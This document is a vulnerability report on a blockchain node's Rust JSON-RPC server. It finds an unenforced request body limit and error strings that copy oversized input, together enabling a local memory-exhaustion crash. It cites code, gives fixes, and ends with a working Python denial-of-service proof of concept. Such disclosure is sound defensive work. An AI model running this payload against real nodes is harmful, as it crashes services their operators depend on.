### Title
Unenforced `max_request_body_size` + Unbounded Error String Allocation in `visit_str` Enables Local RPC OOM — (`rpc/src/server.rs`, `util/jsonrpc-types/src/uints.rs`)

---

### Summary

The `max_request_body_size` configuration field is read but **never applied** to the axum HTTP server. No body-size-limiting middleware is added to the router. As a result, an attacker with local RPC access can POST an arbitrarily large body. When that body contains a malformed `Uint64` field (e.g., `"0x"` + `"f" * N`), `visit_str` calls `from_str_radix`, which fails, and then `format!("Invalid {} {}: {}", T::NAME, value, e)` allocates a new `String` that copies the entire input — causing unbounded heap growth proportional to the request body size.

---

### Finding Description

**Step 1 — `max_request_body_size` is dead configuration.**

`RpcServer::new()` receives `config: RpcConfig` which carries `max_request_body_size`, but `start_server()` never uses it: [1](#0-0) 

No `tower_http::limit::RequestBodyLimitLayer` or axum `DefaultBodyLimit` layer is added to the router. The configured value (default 10 MiB) is silently ignored.

**Step 2 — The full body is buffered unconditionally.**

`handle_jsonrpc` extracts the entire request body as `Bytes` with no prior size gate: [2](#0-1) 

**Step 3 — `visit_str` allocates an error string equal in size to the input.**

When `from_str_radix` fails (e.g., value too large), the error path at line 78 formats a new `String` that embeds the full `value` slice: [3](#0-2) 

For a 100 MB input, this allocates a 100 MB+ error string on top of the already-buffered body.

**Step 4 — The same pattern exists for the prefix-check paths (lines 62–66 and 69–73).** [4](#0-3) 

All three error branches embed `value` verbatim.

---

### Impact Explanation

Each malformed oversized request causes at minimum two full copies of the body to reside in heap simultaneously (the `Bytes` buffer + the `format!` error string). Sending several concurrent requests with 500 MB bodies can exhaust available RAM and OOM-kill the node process. Even without OOM, `from_str_radix` iterates every byte of the hex string before returning an error, so large inputs also cause CPU stalls.

---

### Likelihood Explanation

The RPC is bound to `127.0.0.1:8114` by default, so exploitation requires local access to the machine running the node (same user, another local user, or a compromised local process). This is consistent with the stated scope of "local RPC API crash." The attack requires no authentication, no key material, and no special privileges beyond TCP connectivity to the loopback interface. [5](#0-4) 

---

### Recommendation

1. **Enforce `max_request_body_size` in the axum router.** Add a `DefaultBodyLimit` layer using the configured value:
   ```rust
   use axum::extract::DefaultBodyLimit;
   // in start_server, after building the router:
   .layer(DefaultBodyLimit::max(config.max_request_body_size))
   ``` [6](#0-5) 

2. **Truncate `value` in error messages in `visit_str`.** Cap the displayed string to a fixed length (e.g., 64 bytes) before embedding it in `format!`:
   ```rust
   let display = if value.len() > 64 { &value[..64] } else { value };
   Error::custom(format!("Invalid {} {}…: {}", T::NAME, display, e))
   ``` [3](#0-2) 

---

### Proof of Concept

```python
import socket, time

# Connect to local RPC
payload = '{"jsonrpc":"2.0","method":"get_block_by_number","params":["0x' + 'f' * 50_000_000 + '"],"id":1}'
body = payload.encode()
request = (
    f"POST / HTTP/1.1\r\nHost: 127.0.0.1:8114\r\n"
    f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\n\r\n"
).encode() + body

s = socket.create_connection(("127.0.0.1", 8114))
s.sendall(request)
# Node process heap grows by ~100MB+ per request;
# repeat 5-10 times concurrently to trigger OOM
time.sleep(2)
print(s.recv(4096))
s.close()
```

The 50 MB hex string passes the `0x`-prefix check, reaches `from_str_radix` (which iterates all 50 M characters), fails with overflow, and then `format!` allocates a ~50 MB error string. No body-size guard fires because `max_request_body_size` is never wired into the axum middleware stack.

### Citations

**File:** rpc/src/server.rs (L97-130)
```rust
    fn start_server(
        rpc: &Arc<MetaIoHandler<Option<Session>>>,
        address: String,
        handler: Handle,
        enable_websocket: bool,
    ) -> Result<SocketAddr, AnyError> {
        let stream_config = StreamServerConfig::default()
            .with_keep_alive(true)
            .with_pipeline_size(4)
            .with_shutdown(async move {
                new_tokio_exit_rx().cancelled().await;
            });

        // HTTP and WS server.
        let post_router = post(handle_jsonrpc::<Option<Session>>);
        let get_router = if enable_websocket {
            get(handle_jsonrpc_ws::<Option<Session>>)
        } else {
            get(get_error_handler)
        };
        let method_router = post_router.merge(get_router);

        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));

```

**File:** rpc/src/server.rs (L218-238)
```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
    let make_error_response = |error| {
        Json(jsonrpc_core::Failure {
            jsonrpc: Some(jsonrpc_core::Version::V2),
            id: jsonrpc_core::Id::Null,
            error,
        })
        .into_response()
    };

    let req = match std::str::from_utf8(req_body.as_ref()) {
        Ok(req) => req,
        Err(_) => {
            return make_error_response(jsonrpc_core::Error::parse_error());
        }
    };

    let req = serde_json::from_str::<Request>(req);
```

**File:** util/jsonrpc-types/src/uints.rs (L61-74)
```rust
        if value_bytes.len() < 3 || &value_bytes[..2] != b"0x" {
            return Err(Error::custom(format!(
                "Invalid {} {}: without `0x` prefix",
                T::NAME,
                value
            )));
        }
        if value_bytes[2] == b'0' && value_bytes.len() > 3 {
            return Err(Error::custom(format!(
                "Invalid {} {}: with redundant leading zeros",
                T::NAME,
                value,
            )));
        }
```

**File:** util/jsonrpc-types/src/uints.rs (L76-79)
```rust
        T::from_str_radix(&value[2..], 16)
            .map(JsonUint)
            .map_err(|e| Error::custom(format!("Invalid {} {}: {}", T::NAME, value, e)))
    }
```

**File:** resource/ckb.toml (L182-187)
```text
listen_address = "127.0.0.1:8114" # {{
# _ => listen_address = "127.0.0.1:{rpc_port}"
# }}

# Default is 10MiB = 10 * 1024 * 1024
max_request_body_size = 10485760
```
